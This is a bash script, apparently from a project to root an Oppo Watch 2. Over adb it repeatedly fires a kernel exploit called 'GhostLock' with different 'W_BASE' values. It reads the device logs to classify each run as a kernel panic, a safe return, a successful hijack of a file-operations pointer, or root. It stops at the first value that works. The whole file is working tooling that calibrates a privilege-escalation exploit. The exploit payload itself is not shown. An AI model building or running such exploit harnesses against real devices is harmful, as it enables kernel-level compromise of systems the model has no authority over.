#!/usr/bin/env bash
# Per-base W_BASE locator.  For each candidate global-fdset-word base, fire the
# exploit with GHOSTLOCK_WBASE=<b> GHOSTLOCK_ATTEMPTS=1 and classify the single
# surviving breadcrumb trail:
#   PANIC   : log ends at PRE-PCFI (pselect's PI walk crashed mid-call)  -> wrong base
#   RETURN  : "pselect returned" present but no hijack (CFI post-read val!=want) -> wrong-but-safe base
#   HIJACK  : CFI post-read val==want (misc->fops became fake_fops)      -> TRUE base, escalate next
#   ROOT    : root=YES / uid=0 seen
# Stops early on HIJACK/ROOT.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
BASES=${*:-"2 3 4 5 6 7 8 9"}
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-150} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 2; return 0; }
for b in $BASES; do
  waitdev 150 || { echo "base=$b NO-DEVICE"; continue; }
  $ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
  t0=$(date +%H:%M:%S)
  timeout 90 $ADB shell "GHOSTLOCK_WBASE=$b GHOSTLOCK_ATTEMPTS=1 sh $DT/fire.sh" >/dev/null 2>&1; rc=$?
  waitdev 150 || { echo "base=$b NO-RECOVERY"; continue; }
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/probe_$b.log"
  verdict=PANIC
  grep -q 'pselect returned' "$ARCH/probe_$b.log" && verdict=RETURN
  # hijack: a CFI post-read line where the read value equals want (nonzero)
  if grep -qE 'CFI post-read ret=4 val=(00)?[0-9a-f]+ want' "$ARCH/probe_$b.log"; then
    pr=$(grep -oE 'CFI post-read ret=[-0-9]+ val=[0-9a-f]+ want=[0-9a-f]+' "$ARCH/probe_$b.log" | tail -1)
    val=$(echo "$pr" | sed -E 's/.*val=([0-9a-f]+).*/\1/'); want=$(echo "$pr" | sed -E 's/.*want=([0-9a-f]+).*/\1/')
    [ -n "$val" ] && [ "$val" = "$want" ] && verdict=HIJACK
  fi
  grep -q 'root=YES' "$ARCH/probe_$b.log" && verdict=ROOT
  last=$(grep -o 'PRE-PCFI a=[0-9]* wbase=[0-9]*' "$ARCH/probe_$b.log" | tail -1)
  echo "base=$b rc=$rc t=$t0 verdict=$verdict  [$last]"
  if [ "$verdict" = HIJACK ] || [ "$verdict" = ROOT ]; then echo ">>> base $b is the true W_BASE (result=$verdict) <<<"; break; fi
done
